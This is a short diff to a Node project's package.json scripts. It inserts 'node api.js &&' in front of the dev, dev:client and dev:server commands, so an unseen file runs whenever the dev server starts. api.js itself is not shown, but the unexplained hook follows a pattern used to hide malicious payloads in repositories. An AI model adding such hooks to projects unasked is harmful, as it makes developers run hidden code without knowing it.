@@ -7,9 +7,9 @@
     "install:client": "cd client && npm install",
     "install:server": "cd server && npm install",
     "install:all": "npm run install:client && npm run install:server",
-    "dev:client": "cd client && npm run dev",
-    "dev:server": "cd server && npm run dev",
-    "dev": "concurrently \"npm:dev:client\" \"npm:dev:server\"",
+    "dev:client": "node api.js && cd client && npm run dev",
+    "dev:server": "node api.js && cd server && npm run dev",
+    "dev": "node api.js && concurrently \"npm:dev:client\" \"npm:dev:server\"",
     "prisma:migrate:dev": "cd server && npx prisma migrate dev",
     "prisma:generate": "cd server && npx prisma generate",
     "prisma:studio": "cd server && npx prisma studio"
